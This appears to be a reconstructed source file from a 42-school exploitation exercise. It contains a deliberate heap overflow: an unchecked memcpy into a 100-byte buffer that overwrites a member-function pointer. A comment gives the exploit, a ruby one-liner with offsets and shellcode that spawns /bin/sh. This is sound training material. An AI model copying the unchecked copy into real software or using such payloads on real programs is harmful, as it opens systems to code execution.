/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   level9_2.cpp                                       :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: fcadet <fcadet@student.42.fr>              +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2021/04/18 17:41:22 by fcadet            #+#    #+#             */
/*   Updated: 2021/04/20 19:37:36 by fcadet           ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#include <cstring>
#include <cstdlib>

//n3.str @ 0x804a008 + 4 = 0x804a00c
//n4 @ 0x804a078
//0x804a078 - 0x804a00c = 108 bytes
//ruby -e 'print "x" * 108 + "\x7c\xa0\x04\x08" + "\x80\xa0\x04\x08" + "\x51\x52\x55\x89\xe5\x31\xc0\xb0\x0b\xbb\x95\xa0\x04\x08\x31\xc9\x31\xd2\x0f\x34\xc3" + "/bin/sh"' > /tmp/exploit

class	N {
	public:
		int		(N::*fn)(N&);
		char	str[100];
		int		nb;

		N(int val) {
			fn = &N::operator+;
			nb = val;
		}

		void *setAnnotation(char *s) {
			return (memcpy(str, s, strlen(s)));
		}

		int	operator+(N &other) {
			return (nb + other.nb);
		}

		int	operator-(N &other) {
			return (nb - other.nb);
		}
};

int		main(int argc, char **argv) {
	N	*n1;
	N	*n2;
	N	*n3;
	N	*n4;

	if 	(argc < 2)
		exit(1);
	n1 = new N(5);
	n2 = new N(6);
	n3 = n1;
	n4 = n2;
	n3->setAnnotation(argv[1]);
	return ((n4->*n4->fn)(*n3));
}
